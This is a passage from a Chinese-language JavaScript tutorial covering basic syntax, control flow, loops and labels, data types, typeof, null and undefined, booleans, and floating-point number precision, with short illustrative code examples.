   2017年6月，《ECMAScript 2017 标准》发布，正式引入了 async 函数，使得异步操作的写法出现了根本的变化。

   2017年11月，所有主流浏览器全部支持 WebAssembly，这意味着任何语言都可以编译成 JavaScript，在浏览器运行。

参考链接
-------

   - Axel Rauschmayer, [The Past, Present, and Future of JavaScript](https://www.oreilly.com/library/view/the-past-present/9781449343545/)
   - John Dalziel, [The race for speed part 4: The future for JavaScript](http://creativejs.com/2013/06/the-race-for-speed-part-4-the-future-for-javascript/)
   - Axel Rauschmayer, [Basic JavaScript for the impatient programmer](https://www.2ality.com/2013/06/basic-javascript.html)
   - balena.io, [Happy 18th Birthday JavaScript! A look at an unlikely past and bright future](https://www.balena.io/blog/happy-18th-birthday-javascript/)

/🟠 JavaScript 的基本语法 
========================

   JavaScript 程序的执行单位为行（line），也就是一行一行地执行。一般情况下，每一行就是一个语句。

   语句（statement）是为了完成某种任务而进行的操作，比如下面就是一行赋值语句。

   .. code:: javascript

      var a = 1 + 3;

   这条语句先用 ``var`` 命令，声明了变量 ``a`` ，然后将 ``1 + 3`` 的运算结果赋值给变量 ``a`` 。

    ``1 + 3`` 叫做表达式（expression），指一个为了得到返回值的计算式。语句和表达式的区别在于，前者主要为了进行某种操作，一般情况下不需要返回值；后者则是为了得到返回值，一定会返回一个值。凡是 JavaScript 语言中预期为值的地方，都可以使用表达式。比如，赋值语句的等号右边，预期是一个值，因此可以放置各种表达式。

   语句以分号结尾，一个分号就表示一个语句结束。多个语句可以写在一行内。

   .. code:: javascript

      var a = 1 + 3 ; var b = 'abc';

   分号前面可以没有任何内容，JavaScript 引擎将其视为空语句。

   .. code:: javascript

      ;;;

   上面的代码就表示3个空语句。

   表达式不需要分号结尾。一旦在表达式后面添加分号，则 JavaScript 引擎就将表达式视为语句，这样会产生一些没有任何意义的语句。

   .. code:: javascript

      1 + 3;
      'abc';

   上面两行语句只是单纯地产生一个值，并没有任何实际的意义。


变 量
----

   变量是对“值”的具名引用。变量就是为“值”起名，然后引用这个名字，就等同于引用这个值。变量的名字就是变量名。

   .. code:: javascript

      var a = 1;

   上面的代码先声明变量 ``a`` ，然后在变量 ``a`` 与数值1之间建立引用关系，称为将数值1“赋值”给变量 ``a`` 。以后，引用变量名 ``a`` 就会得到数值1。最前面的 ``var`` ，是变量声明命令。它表示通知解释引擎，要创建一个变量 ``a`` 。

   注意，JavaScript 的变量名区分大小写， ``A`` 和 ``a`` 是两个不同的变量。

   变量的声明和赋值，是分开的两个步骤，上面的代码将它们合在了一起，实际的步骤是下面这样。

   .. code:: javascript

      var a;
      a = 1;

   如果只是声明变量而没有赋值，则该变量的值是 ``undefined`` 。 ``undefined`` 是一个特殊的值，表示“无定义”。

   .. code:: javascript

      var a;
      a // undefined

   如果变量赋值的时候，忘了写 ``var`` 命令，这条语句也是有效的。

   .. code:: javascript

      var a = 1;
      // 基本等同
      a = 1;

   但是，不写 ``var`` 的做法，不利于表达意图，而且容易不知不觉地创建全局变量，所以建议总是使用 ``var`` 命令声明变量。

   如果一个变量没有声明就直接使用，JavaScript 会报错，告诉你变量未定义。

   .. code:: javascript

      x
      // ReferenceError: x is not defined

   上面代码直接使用变量 ``x`` ，系统就报错，告诉你变量 ``x`` 没有声明。

   可以在同一条 ``var`` 命令中声明多个变量。

   .. code:: javascript

      var a, b;

   JavaScript 是一种动态类型语言，也就是说，变量的类型没有限制，变量可以随时更改类型。

   .. code:: javascript

      var a = 1;
      a = 'hello';

   上面代码中，变量 ``a`` 起先被赋值为一个数值，后来又被重新赋值为一个字符串。第二次赋值的时候，因为变量 ``a`` 已经存在，所以不需要使用 ``var`` 命令。

   如果使用 ``var`` 重新声明一个已经存在的变量，是无效的。

   .. code:: javascript

      var x = 1;
      var x;
      x // 1

   上面代码中，变量 ``x`` 声明了两次，第二次声明是无效的。

   但是，如果第二次声明的时候还进行了赋值，则会覆盖掉前面的值。

   .. code:: javascript

      var x = 1;
      var x = 2;
   
      // 等同于
   
      var x = 1;
      var x;
      x = 2;

变量提升
~~~~~~~

   JavaScript 引擎的工作方式是，先解析代码，获取所有被声明的变量，然后再一行一行地运行。这造成的结果，就是所有的变量的声明语句，都会被提升到代码的头部，这就叫做变量提升（hoisting）。

   .. code:: javascript

      console.log(a);
      var a = 1;

   上面代码首先使用 ``console.log`` 方法，在控制台（console）显示变量 ``a`` 的值。这时变量 ``a`` 还没有声明和赋值，所以这是一种错误的做法，但是实际上不会报错。因为存在变量提升，真正运行的是下面的代码。

   .. code:: javascript

      var a;
      console.log(a);
      a = 1;

   最后的结果是显示 ``undefined`` ，表示变量 ``a`` 已声明，但还未赋值。

标识符
-----

   标识符（identifier）指的是用来识别各种值的合法名称。最常见的标识符就是变量名，以及后面要提到的函数名。JavaScript 语言的标识符对大小写敏感，所以 ``a`` 和 ``A`` 是两个不同的标识符。

   标识符有一套命名规则，不符合规则的就是非法标识符。JavaScript 引擎遇到非法标识符，就会报错。

   简单说，标识符命名规则如下。

   - 第一个字符，可以是任意 Unicode 字母（包括英文字母和其他语言的字母），以及美元符号（ ``$`` ）和下划线（ ``_`` ）。
   - 第二个字符及后面的字符，除了 Unicode 字母、美元符号和下划线，还可以用数字 ``0-9`` 。

   下面这些都是合法的标识符。

   .. code:: javascript

      arg0
      _tmp
      $elem
      π

   下面这些则是不合法的标识符。

   .. code:: javascript

      1a  // 第一个字符不能是数字
      23  // 同上
      ***  // 标识符不能包含星号
      a+b  // 标识符不能包含加号
      -d  // 标识符不能包含减号或连词线

   中文是合法的标识符，可以用作变量名。

   .. code:: javascript

      var 临时变量 = 1;

   > JavaScript 有一些保留字，不能用作标识符：arguments、break、case、catch、class、const、continue、debugger、default、delete、do、else、enum、eval、export、extends、false、finally、for、function、if、implements、import、in、instanceof、interface、let、new、null、package、private、protected、public、return、static、super、switch、this、throw、true、try、typeof、var、void、while、with、yield。

注释
---

   源码中被 JavaScript 引擎忽略的部分就叫做注释，它的作用是对代码进行解释。JavaScript 提供两种注释的写法：一种是单行注释，用 ``//`` 起头；另一种是多行注释，放在 ``/*`` 和 ``*/`` 之间。

   .. code:: javascript

      // 这是单行注释
   
      /*
       这是
       多行
       注释
      */

   此外，由于历史上 JavaScript 可以兼容 HTML 代码的注释，所以 ``<!--`` 和 ``-->`` 也被视为合法的单行注释。

   .. code:: javascript

      x = 1; <!-- x = 2;
      --> x = 3;

   上面代码中，只有 ``x = 1`` 会执行，其他的部分都被注释掉了。

   需要注意的是，``-->`` 只有在行首，才会被当成单行注释，否则会当作正常的运算。

   .. code:: javascript

      function countdown(n) {
        while (n --> 0) console.log(n);
      }
      countdown(3)
      // 2
      // 1
      // 0

   上面代码中， ``n --> 0`` 实际上会当作 ``n-- > 0`` ，因此输出2、1、0。

区块
---

   JavaScript 使用大括号，将多个相关的语句组合在一起，称为“区块”（block）。

   对于 ``var`` 命令来说，JavaScript 的区块不构成单独的作用域（scope）。

   .. code:: javascript

      {
        var a = 1;
      }
   
      a // 1

   上面代码在区块内部，使用 ``var`` 命令声明并赋值了变量 ``a`` ，然后在区块外部，变量 ``a`` 依然有效，区块对于 ``var`` 命令不构成单独的作用域，与不使用区块的情况没有任何区别。在 JavaScript 语言中，单独使用区块并不常见，区块往往用来构成其他更复杂的语法结构，比如 ``for`` 、 ``if`` 、 ``while`` 、 ``function`` 等。

条件语句
-------

   JavaScript 提供 ``if`` 结构和 ``switch`` 结构，完成条件判断，即只有满足预设的条件，才会执行相应的语句。

if 结构
~~~~~~

    ``if`` 结构先判断一个表达式的布尔值，然后根据布尔值的真伪，执行不同的语句。所谓布尔值，指的是 JavaScript 的两个特殊值， ``true`` 表示“真”， ``false`` 表示“伪”。

   .. code:: javascript

      if (布尔值)
        语句;
   
      // 或者
      if (布尔值) 语句;

   上面是 ``if`` 结构的基本形式。需要注意的是，“布尔值”往往由一个条件表达式产生的，必须放在圆括号中，表示对表达式求值。如果表达式的求值结果为 ``true`` ，就执行紧跟在后面的语句；如果结果为 ``false`` ，则跳过紧跟在后面的语句。

   .. code:: javascript

      if (m === 3)
        m = m + 1;

   上面代码表示，只有在 ``m`` 等于3时，才会将其值加上1。

   这种写法要求条件表达式后面只能有一个语句。如果想执行多个语句，必须在 ``if`` 的条件判断之后，加上大括号，表示代码块（多个语句合并成一个语句）。

   .. code:: javascript

      if (m === 3) {
        m += 1;
      }

   建议总是在 ``if`` 语句中使用大括号，因为这样方便插入语句。

   注意， ``if`` 后面的表达式之中，不要混淆赋值表达式（ ``=`` ）、严格相等运算符（ ``===`` ）和相等运算符（ ``==`` ）。尤其是赋值表达式不具有比较作用。

   .. code:: javascript

      var x = 1;
      var y = 2;
      if (x = y) {
        console.log(x);
      }
      // "2"

   上面代码的原意是，当 ``x`` 等于 ``y`` 的时候，才执行相关语句。但是，不小心将严格相等运算符写成赋值表达式，结果变成了将 ``y`` 赋值给变量 ``x`` ，再判断变量 ``x`` 的值（等于2）的布尔值（结果为 ``true`` ）。

   这种错误可以正常生成一个布尔值，因而不会报错。为了避免这种情况，有些开发者习惯将常量写在运算符的左边，这样的话，一旦不小心将相等运算符写成赋值运算符，就会报错，因为常量不能被赋值。

   .. code:: javascript

      if (x = 2) { // 不报错
      if (2 = x) { // 报错

   至于为什么优先采用“严格相等运算符”（ ``===`` ），而不是“相等运算符”（ ``==`` ），请参考《运算符》章节。

if...else 结构
~~~~~~~~~~~~~~

    ``if`` 代码块后面，还可以跟一个 ``else`` 代码块，表示不满足条件时，所要执行的代码。

   .. code:: javascript

      if (m === 3) {
        // 满足条件时，执行的语句
      } else {
        // 不满足条件时，执行的语句
      }

   上面代码判断变量 ``m`` 是否等于3，如果等于就执行 ``if`` 代码块，否则执行 ``else`` 代码块。

   对同一个变量进行多次判断时，多个 ``if...else`` 语句可以连写在一起。

   .. code:: javascript

      if (m === 0) {
        // ...
      } else if (m === 1) {
        // ...
      } else if (m === 2) {
        // ...
      } else {
        // ...
      }

    ``else`` 代码块总是与离自己最近的那个 ``if`` 语句配对。

   .. code:: javascript

      var m = 1;
      var n = 2;
   
      if (m !== 1)
      if (n === 2) console.log('hello');
      else console.log('world');

   上面代码不会有任何输出， ``else`` 代码块不会得到执行，因为它跟着的是最近的那个 ``if`` 语句，相当于下面这样。

   .. code:: javascript

      if (m !== 1) {
        if (n === 2) {
          console.log('hello');
        } else {
          console.log('world');
        }
      }

   如果想让 ``else`` 代码块跟随最上面的那个 ``if`` 语句，就要改变大括号的位置。

   .. code:: javascript

      if (m !== 1) {
        if (n === 2) {
          console.log('hello');
        }
      } else {
        console.log('world');
      }
      // world

switch 结构
~~~~~~~~~~

   多个 ``if...else`` 连在一起使用的时候，可以转为使用更方便的 ``switch`` 结构。

   .. code:: javascript

      switch (fruit) {
        case "banana":
          // ...
          break;
        case "apple":
          // ...
          break;
        default:
          // ...
      }

   上面代码根据变量 ``fruit`` 的值，选择执行相应的 ``case`` 。如果所有 ``case`` 都不符合，则执行最后的 ``default`` 部分。需要注意的是，每个 ``case`` 代码块内部的 ``break`` 语句不能少，否则会接下去执行下一个 ``case`` 代码块，而不是跳出 ``switch`` 结构。

   .. code:: javascript

      var x = 1;
   
      switch (x) {
        case 1:
          console.log('x 等于1');
        case 2:
          console.log('x 等于2');
        default:
          console.log('x 等于其他值');
      }
      // x等于1
      // x等于2
      // x等于其他值

   上面代码中， ``case`` 代码块之中没有 ``break`` 语句，导致不会跳出 ``switch`` 结构，而会一直执行下去。正确的写法是像下面这样。

   .. code:: javascript

      switch (x) {
        case 1:
          console.log('x 等于1');
          break;
        case 2:
          console.log('x 等于2');
          break;
        default:
          console.log('x 等于其他值');
      }

    ``switch`` 语句部分和 ``case`` 语句部分，都可以使用表达式。

   .. code:: javascript

      switch (1 + 3) {
        case 2 + 2:
          f();
          break;
        default:
          neverHappens();
      }

   上面代码的 ``default`` 部分，是永远不会执行到的。

   需要注意的是， ``switch`` 语句后面的表达式，与 ``case`` 语句后面的表示式比较运行结果时，采用的是严格相等运算符（ ``===`` ），而不是相等运算符（ ``==`` ），这意味着比较时不会发生类型转换。

   .. code:: javascript

      var x = 1;
   
      switch (x) {
        case true:
          console.log('x 发生类型转换');
          break;
        default:
          console.log('x 没有发生类型转换');
      }
      // x 没有发生类型转换

   上面代码中，由于变量 ``x`` 没有发生类型转换，所以不会执行 ``case true`` 的情况。这表明， ``switch`` 语句内部采用的是“严格相等运算符”，详细解释请参考《运算符》一节。

三元运算符 ?:
~~~~~~~~~~~~

   JavaScript 还有一个三元运算符（即该运算符需要三个运算子） ``?:`` ，也可以用于逻辑判断。

   .. code:: javascript

      (条件) ? 表达式1 : 表达式2

   上面代码中，如果“条件”为 ``true`` ，则返回“表达式1”的值，否则返回“表达式2”的值。

   .. code:: javascript

      var even = (n % 2 === 0) ? true : false;

   上面代码中，如果 ``n`` 可以被2整除，则 ``even`` 等于 ``true`` ，否则等于 ``false`` 。它等同于下面的形式。

   .. code:: javascript

      var even;
      if (n % 2 === 0) {
        even = true;
      } else {
        even = false;
      }

   这个三元运算符可以被视为 ``if...else...`` 的简写形式，因此可以用于多种场合。

   .. code:: javascript

      var myVar;
      console.log(
        myVar ?
        'myVar has a value' :
        'myVar does not have a value'
      )
      // myVar does not have a value

   上面代码利用三元运算符，输出相应的提示。

   .. code:: javascript

      var msg = '数字' + n + '是' + (n % 2 === 0 ? '偶数' : '奇数');

   上面代码利用三元运算符，在字符串之中插入不同的值。

循环语句
-------

   循环语句用于重复执行某个操作，它有多种形式。

while 循环
~~~~~~~~~~

    ``while`` 语句包括一个循环条件和一段代码块，只要条件为真，就不断循环执行代码块。

   .. code:: javascript

      while (条件)
        语句;
   
      // 或者
      while (条件) 语句;

    ``while`` 语句的循环条件是一个表达式，必须放在圆括号中。代码块部分，如果只有一条语句，可以省略大括号，否则就必须加上大括号。

   .. code:: javascript

      while (条件) {
        语句;
      }

   下面是 ``while`` 语句的一个例子。

   .. code:: javascript

      var i = 0;
   
      while (i < 100) {
        console.log('i 当前为：' + i);
        i = i + 1;
      }

   上面的代码将循环100次，直到 ``i`` 等于100为止。

   下面的例子是一个无限循环，因为循环条件总是为真。

   .. code:: javascript

      while (true) {
        console.log('Hello, world');
      }

for 循环
~~~~~~~

    ``for`` 语句是循环命令的另一种形式，可以指定循环的起点、终点和终止条件。它的格式如下。

   .. code:: javascript

      for (初始化表达式; 条件; 递增表达式)
        语句
   
      // 或者
   
      for (初始化表达式; 条件; 递增表达式) {
        语句
      }

    ``for`` 语句后面的括号里面，有三个表达式。

   - 初始化表达式（initialize）：确定循环变量的初始值，只在循环开始时执行一次。
   - 条件表达式（test）：每轮循环开始时，都要执行这个条件表达式，只有值为真，才继续进行循环。
   - 递增表达式（increment）：每轮循环的最后一个操作，通常用来递增循环变量。

   下面是一个例子。

   .. code:: javascript

      var x = 3;
      for (var i = 0; i < x; i++) {
        console.log(i);
      }
      // 0
      // 1
      // 2

   上面代码中，初始化表达式是 ``var i = 0`` ，即初始化一个变量 ``i`` ；测试表达式是 ``i < x`` ，即只要 ``i`` 小于 ``x`` ，就会执行循环；递增表达式是 ``i++`` ，即每次循环结束后， ``i`` 增大1。

   所有 ``for`` 循环，都可以改写成 ``while`` 循环。上面的例子改为 ``while`` 循环，代码如下。

   .. code:: javascript

      var x = 3;
      var i = 0;
   
      while (i < x) {
        console.log(i);
        i++;
      }

    ``for`` 语句的三个部分（initialize、test、increment），可以省略任何一个，也可以全部省略。

   .. code:: javascript

      for ( ; ; ){
        console.log('Hello World');
      }

   上面代码省略了 ``for`` 语句表达式的三个部分，结果就导致了一个无限循环。

do...while 循环
~~~~~~~~~~~~~~

    ``do...while`` 循环与 ``while`` 循环类似，唯一的区别就是先运行一次循环体，然后判断循环条件。

   .. code:: javascript

      do
        语句
      while (条件);
   
      // 或者
      do {
        语句
      } while (条件);

   不管条件是否为真， ``do...while`` 循环至少运行一次，这是这种结构最大的特点。另外， ``while`` 语句后面的分号注意不要省略。

   下面是一个例子。

   .. code:: javascript

      var x = 3;
      var i = 0;
   
      do {
        console.log(i);
        i++;
      } while(i < x);

break 语句和 continue 语句
~~~~~~~~~~~~~~~~~~~~~~~~

    ``break`` 语句和 ``continue`` 语句都具有跳转作用，可以让代码不按既有的顺序执行。

    ``break`` 语句用于跳出代码块或循环。

   .. code:: javascript

      var i = 0;
   
      while(i < 100) {
        console.log('i 当前为：' + i);
        i++;
        if (i === 10) break;
      }

   上面代码只会执行10次循环，一旦 ``i`` 等于10，就会跳出循环。

    ``for`` 循环也可以使用 ``break`` 语句跳出循环。

   .. code:: javascript

      for (var i = 0; i < 5; i++) {
        console.log(i);
        if (i === 3)
          break;
      }
      // 0
      // 1
      // 2
      // 3

   上面代码执行到 ``i`` 等于3，就会跳出循环。

    ``continue`` 语句用于立即终止本轮循环，返回循环结构的头部，开始下一轮循环。

   .. code:: javascript

      var i = 0;
   
      while (i < 100){
        i++;
        if (i % 2 === 0) continue;
        console.log('i 当前为：' + i);
      }

   上面代码只有在 ``i`` 为奇数时，才会输出 ``i`` 的值。如果 ``i`` 为偶数，则直接进入下一轮循环。

   如果存在多重循环，不带参数的 ``break`` 语句和 ``continue`` 语句都只针对最内层循环。

标签（label）
~~~~~~~~~~~~

   JavaScript 语言允许，语句的前面有标签（label），相当于定位符，用于跳转到程序的任意位置，标签的格式如下。

   .. code:: javascript

      label:
        语句

   标签可以是任意的标识符，但不能是保留字，语句部分可以是任意语句。

   标签通常与 ``break`` 语句和 ``continue`` 语句配合使用，跳出特定的循环。

   .. code:: javascript

      top:
        for (var i = 0; i < 3; i++){
          for (var j = 0; j < 3; j++){
            if (i === 1 && j === 1) break top;
            console.log('i=' + i + ', j=' + j);
          }
        }
      // i=0, j=0
      // i=0, j=1
      // i=0, j=2
      // i=1, j=0

   上面代码为一个双重循环区块， ``break`` 命令后面加上了 ``top`` 标签（注意， ``top`` 不用加引号），满足条件时，直接跳出双层循环。如果 ``break`` 语句后面不使用标签，则只能跳出内层循环，进入下一次的外层循环。

   标签也可以用于跳出代码块。

   .. code:: javascript

      foo: {
        console.log(1);
        break foo;
        console.log('本行不会输出');
      }
      console.log(2);
      // 1
      // 2

   上面代码执行到 ``break foo`` ，就会跳出区块。

    ``continue`` 语句也可以与标签配合使用。

   .. code:: javascript

      top:
        for (var i = 0; i < 3; i++){
          for (var j = 0; j < 3; j++){
            if (i === 1 && j === 1) continue top;
            console.log('i=' + i + ', j=' + j);
          }
        }
      // i=0, j=0
      // i=0, j=1
      // i=0, j=2
      // i=1, j=0
      // i=2, j=0
      // i=2, j=1
      // i=2, j=2

   上面代码中， ``continue`` 命令后面有一个标签名，满足条件时，会跳过当前循环，直接进入下一轮外层循环。如果 ``continue`` 语句后面不使用标签，则只能进入下一轮的内层循环。

参考链接
-------

   - Axel Rauschmayer, [Basic JavaScript for the impatient programmer](https://2ality.com/2013/06/basic-javascript.html)


/🟡2. 数据类型
================================================================================

/🟠 数据类型概述
==============


简介
---

   JavaScript 语言的每一个值，都属于某一种数据类型。JavaScript 的数据类型，共有六种。（ES6 又新增了 Symbol 和 BigInt 数据类型，本教程不涉及。）

   - 数值（number）：整数和小数（比如 ``1`` 和 ``3.14`` ）。
   - 字符串（string）：文本（比如 ``Hello World`` ）。
   - 布尔值（boolean）：表示真伪的两个特殊值，即 ``true`` （真）和 ``false`` （假）。
   -  ``undefined`` ：表示“未定义”或不存在，即由于目前没有定义，所以此处暂时没有任何值。
   -  ``null`` ：表示空值，即此处的值为空。
   - 对象（object）：各种值组成的集合。

   通常，数值、字符串、布尔值这三种类型，合称为原始类型（primitive type）的值，即它们是最基本的数据类型，不能再细分了。对象则称为合成类型（complex type）的值，因为一个对象往往是多个原始类型的值的合成，可以看作是一个存放各种值的容器。至于 ``undefined`` 和 ``null`` ，一般将它们看成两个特殊值。

   对象是最复杂的数据类型，又可以分成三个子类型。

   - 狭义的对象（object）
   - 数组（array）
   - 函数（function）

   狭义的对象和数组是两种不同的数据组合方式，除非特别声明，本教程的“对象”都特指狭义的对象。函数其实是处理数据的方法，JavaScript 把它当成一种数据类型，可以赋值给变量，这为编程带来了很大的灵活性，也为 JavaScript 的“函数式编程”奠定了基础。

typeof 运算符
------------

   JavaScript 有三种方法，可以确定一个值到底是什么类型。

   -  ``typeof`` 运算符
   -  ``instanceof`` 运算符
   -  ``Object.prototype.toString`` 方法

    ``instanceof`` 运算符和 ``Object.prototype.toString`` 方法，将在后文介绍。这里介绍 ``typeof`` 运算符。

    ``typeof`` 运算符可以返回一个值的数据类型。

   数值、字符串、布尔值分别返回 ``number`` 、 ``string`` 、 ``boolean`` 。

   .. code:: javascript

      typeof 123 // "number"
      typeof '123' // "string"
      typeof false // "boolean"

   函数返回 ``function`` 。

   .. code:: javascript

      function f() {}
      typeof f
      // "function"

    ``undefined`` 返回 ``undefined`` 。

   .. code:: javascript

      typeof undefined
      // "undefined"

   利用这一点， ``typeof`` 可以用来检查一个没有声明的变量，而不报错。

   .. code:: javascript

      v
      // ReferenceError: v is not defined
   
      typeof v
      // "undefined"

   上面代码中，变量 ``v`` 没有用 ``var`` 命令声明，直接使用就会报错。但是，放在 ``typeof`` 后面，就不报错了，而是返回 ``undefined`` 。

   实际编程中，这个特点通常用在判断语句。

   .. code:: javascript

      // 错误的写法
      if (v) {
        // ...
      }
      // ReferenceError: v is not defined
   
      // 正确的写法
      if (typeof v === "undefined") {
        // ...
      }

   对象返回 ``object`` 。

   .. code:: javascript

      typeof window // "object"
      typeof {} // "object"
      typeof [] // "object"

   上面代码中，空数组（ ``[]`` ）的类型也是 ``object`` ，这表示在 JavaScript 内部，数组本质上只是一种特殊的对象。这里顺便提一下， ``instanceof`` 运算符可以区分数组和对象。 ``instanceof`` 运算符的详细解释，请见《面向对象编程》一章。

   .. code:: javascript

      var o = {};
      var a = [];
   
      o instanceof Array // false
      a instanceof Array // true

    ``null`` 返回 ``object`` 。

   .. code:: javascript

      typeof null // "object"

    ``null`` 的类型是 ``object`` ，这是由于历史原因造成的。1995年的 JavaScript 语言第一版，只设计了五种数据类型（对象、整数、浮点数、字符串和布尔值），没考虑 ``null`` ，只把它当作 ``object`` 的一种特殊值。后来 ``null`` 独立出来，作为一种单独的数据类型，为了兼容以前的代码， ``typeof null`` 返回 ``object`` 就没法改变了。

参考链接
-------

   - Axel Rauschmayer, [Improving the JavaScript typeof operator](http://www.2ality.com/2011/11/improving-typeof.html)

/🟠 null, undefined 和布尔值
===========================

null 和 undefined
------------------


概述
~~~

    ``null`` 与 ``undefined`` 都可以表示“没有”，含义非常相似。将一个变量赋值为 ``undefined`` 或 ``null`` ，老实说，语法效果几乎没区别。

   .. code:: javascript

      var a = undefined;
      // 或者
      var a = null;

   上面代码中，变量 ``a`` 分别被赋值为 ``undefined`` 和 ``null`` ，这两种写法的效果几乎等价。

   在 ``if`` 语句中，它们都会被自动转为 ``false`` ，相等运算符（ ``==`` ）甚至直接报告两者相等。

   .. code:: javascript

      if (!undefined) {
        console.log('undefined is false');
      }
      // undefined is false
   
      if (!null) {
        console.log('null is false');
      }
      // null is false
   
      undefined == null
      // true

   从上面代码可见，两者的行为是何等相似！谷歌公司开发的 JavaScript 语言的替代品 Dart 语言，就明确规定只有 ``null`` ，没有 ``undefined`` ！

   既然含义与用法都差不多，为什么要同时设置两个这样的值，这不是无端增加复杂度，令初学者困扰吗？这与历史原因有关。

   1995年 JavaScript 诞生时，最初像 Java 一样，只设置了 ``null`` 表示"无"。根据 C 语言的传统， ``null`` 可以自动转为 ``0`` 。

   .. code:: javascript

      Number(null) // 0
      5 + null // 5

   上面代码中， ``null`` 转为数字时，自动变成0。

   但是，JavaScript 的设计者 Brendan Eich，觉得这样做还不够。首先，第一版的 JavaScript 里面， ``null`` 就像在 Java 里一样，被当成一个对象，Brendan Eich 觉得表示“无”的值最好不是对象。其次，那时的 JavaScript 不包括错误处理机制，Brendan Eich 觉得，如果 ``null`` 自动转为0，很不容易发现错误。

   因此，他又设计了一个 ``undefined`` 。区别是这样的： ``null`` 是一个表示“空”的对象，转为数值时为 ``0`` ； ``undefined`` 是一个表示"此处无定义"的原始值，转为数值时为 ``NaN`` 。

   .. code:: javascript

      Number(undefined) // NaN
      5 + undefined // NaN

用法和含义
~~~~~~~~

   对于 ``null`` 和 ``undefined`` ，大致可以像下面这样理解。

    ``null`` 表示空值，即该处的值现在为空。调用函数时，某个参数未设置任何值，这时就可以传入 ``null`` ，表示该参数为空。比如，某个函数接受引擎抛出的错误作为参数，如果运行过程中未出错，那么这个参数就会传入 ``null`` ，表示未发生错误。

    ``undefined`` 表示“未定义”，下面是返回 ``undefined`` 的典型场景。

   .. code:: javascript

      // 变量声明了，但没有赋值
      var i;
      i // undefined
   
      // 调用函数时，应该提供的参数没有提供，该参数等于 undefined
      function f(x) {
        return x;
      }
      f() // undefined
   
      // 对象没有赋值的属性
      var  o = new Object();
      o.p // undefined
   
      // 函数没有返回值时，默认返回 undefined
      function f() {}
      f() // undefined

布尔值
-----

   布尔值代表“真”和“假”两个状态。“真”用关键字 ``true`` 表示，“假”用关键字 ``false`` 表示。布尔值只有这两个值。

   下列运算符会返回布尔值：

   - 前置逻辑运算符：  ``!``  (Not)
   - 相等运算符： ``===`` ， ``!==`` ， ``==`` ， ``!=`` 
   - 比较运算符： ``>`` ， ``>=`` ， ``<`` ， ``<=`` 

   如果 JavaScript 预期某个位置应该是布尔值，会将该位置上现有的值自动转为布尔值。转换规则是除了下面六个值被转为 ``false`` ，其他值都视为 ``true`` 。

   -  ``undefined`` 
   -  ``null`` 
   -  ``false`` 
   -  ``0`` 
   -  ``NaN`` 
   -  ``""`` 或 ``''`` （空字符串）

   布尔值往往用于程序流程的控制，请看一个例子。

   .. code:: javascript

      if ('') {
        console.log('true');
      }
      // 没有任何输出

   上面代码中， ``if`` 命令后面的判断条件，预期应该是一个布尔值，所以 JavaScript 自动将空字符串，转为布尔值 ``false`` ，导致程序不会进入代码块，所以没有任何输出。

   注意，空数组（ ``[]`` ）和空对象（ ``{}`` ）对应的布尔值，都是 ``true`` 。

   .. code:: javascript

      if ([]) {
        console.log('true');
      }
      // true
   
      if ({}) {
        console.log('true');
      }
      // true

   更多关于数据类型转换的介绍，参见《数据类型转换》一章。

参考链接
-------

   - Axel Rauschmayer, [Categorizing values in JavaScript](http://www.2ality.com/2013/01/categorizing-values.html)

/🟠 数值
========

概述
---


整数和浮点数
~~~~~~~~~~

   JavaScript 内部，所有数字都是以64位浮点数形式储存，即使整数也是如此。所以， ``1`` 与 ``1.0`` 是相同的，是同一个数。

   .. code:: javascript

      1 === 1.0 // true

   这就是说，JavaScript 语言的底层根本没有整数，所有数字都是小数（64位浮点数）。容易造成混淆的是，某些运算只有整数才能完成，此时 JavaScript 会自动把64位浮点数，转成32位整数，然后再进行运算，参见《运算符》一章的“位运算”部分。

   由于浮点数不是精确的值，所以涉及小数的比较和运算要特别小心。

   .. code:: javascript

      0.1 + 0.2 === 0.3
      // false
   
      0.3 / 0.1
      // 2.9999999999999996
   
      (0.3 - 0.2) === (0.2 - 0.1)
      // false

数值精度
~~~~~~~

   根据国际标准 IEEE 754，JavaScript 浮点数的64个二进制位，从最左边开始，是这样组成的。

   - 第1位：符号位， ``0`` 表示正数， ``1`` 表示负数
   - 第2位到第12位（共11位）：指数部分
   - 第13位到第64位（共52位）：小数部分（即有效数字）

   符号位决定了一个数的正负，指数部分决定了数值的大小，小数部分决定了数值的精度。

   指数部分一共有11个二进制位，因此大小范围就是0到2047。IEEE 754 规定，如果指数部分的值在0到2047之间（不含两个端点），那么有效数字的第一位默认总是1，不保存在64位浮点数之中。也就是说，有效数字这时总是 ``1.xx...xx`` 的形式，其中 ``xx..xx`` 的部分保存在64位浮点数之中，最长可能为52位。因此，JavaScript 提供的有效数字最长为53个二进制位。

   .. code::

      (-1)^符号位 * 1.xx...xx * 2^指数部分


   上面公式是正常情况下（指数部分在0到2047之间），一个数在 JavaScript 内部实际的表示形式。

   精度最多只能到53个二进制位，这意味着，绝对值小于2的53次方的整数，即-2<sup>53</sup> + 1 到 2<sup>53</sup> - 1，都可以精确表示。

   .. code:: javascript

      Math.pow(2, 53)
      // 9007199254740992
   
      Math.pow(2, 53) + 1
      // 9007199254740992
   
      Math.pow(2, 53) + 2
      // 9007199254740994
   
      Math.pow(2, 53) + 3
      // 9007199254740996
   
      Math.pow(2, 53) + 4
      // 9007199254740996

   上面代码中，大于2的53次方以后，整数运算的结果开始出现错误。所以，大于2的53次方的数值，都无法保持精度。由于2的53次方是一个16位的十进制数值，所以简单的法则就是，JavaScript 对15位的十进制数都可以精确处理。

   .. code:: javascript

      Math.pow(2, 53)
      // 9007199254740992
   
      // 多出的三个有效数字，将无法保存
      9007199254740992111
      // 9007199254740992000

   上面示例表明，大于2的53次方以后，多出来的有效数字（最后三位的 ``111`` ）都会无法保存，变成0。

数值范围
~~~~~~~

   根据标准，64位浮点数的指数部分的长度是11个二进制位，意味着指数部分的最大值是2047（2的11次方减1）。也就是说，64位浮点数的指数部分的值最大为2047，分出一半表示负数，则 JavaScript 能够表示的数值范围为2<sup>1024</sup>到2<sup>-1023</sup>（开区间），超出这个范围的数无法表示。

   如果一个数大于等于2的1024次方，那么就会发生“正向溢出”，即 JavaScript 无法表示这么大的数，这时就会返回 ``Infinity`` 。

   .. code:: javascript

      Math.pow(2, 1024) // Infinity

   如果一个数小于等于2的-1075次方（指数部分最小值-1023，再加上小数部分的52位），那么就会发生为“负向溢出”，即 JavaScript 无法表示这么小的数，这时会直接返回0。

   .. code:: javascript

      Math.pow(2, -1075) // 0

   下面是一个实际的例子。

   .. code:: javascript

      var x = 0.5;
   
      for(var i = 0; i < 25; i++) {
        x = x * x;
      }
   
      x // 0

